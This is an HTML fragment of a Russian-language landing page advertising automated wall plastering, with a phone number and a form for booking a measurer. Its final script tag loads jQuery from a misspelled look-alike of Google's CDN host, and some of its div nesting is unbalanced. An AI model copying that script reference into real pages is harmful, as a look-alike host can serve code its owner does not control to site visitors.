<body>
    <main>

        <div class="container">
            <div class="header">
                <div class="row">

                    <div class="col-md-3">
                        <div class="logo">
                            <img src="img/log_mini 2.png" alt="Гипсолит,штукатурка стен">
                        </div>
                    </div>

                    <div class="col-md-2 offset-md-4">
                        <a class="phone-link" href="#">+7 495 771 05 08</a>
                    </div>

                    <div class="col-md-3">
                        <div class="wrap">
                            <div class="wrap-block">
                                <button class="button header-btn">Получить консультацию</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div> 

            <div class="main-content">
                <div class="row">
                    <div class="col-md-6">
                        <div class="main-title">
                            <h1><b>Автоматизированная штукатурка стен</b></h1>

                                стоимость работ <br>

                    </div>

                            <h2 class="main-form-header">Для расчета точной стоимости<br>закажите <b>выезд замерщика</b></h2>
                            <form action="#">
                                <label for="#">Ваше имя</label>
                                <input type="text" class="main-form-input">
                                <label for="#">Номер телефона</label>
                                <input type="text"  class="main-form-input">
                                <button class="main-form-btn button" type="submit">Оставьте заявку</button>
                                <small>Подарок в день обращения</small>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <div class="box">
                
            </div>

        </div>
    </main>

    <script src="https://ajax.googleapls.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
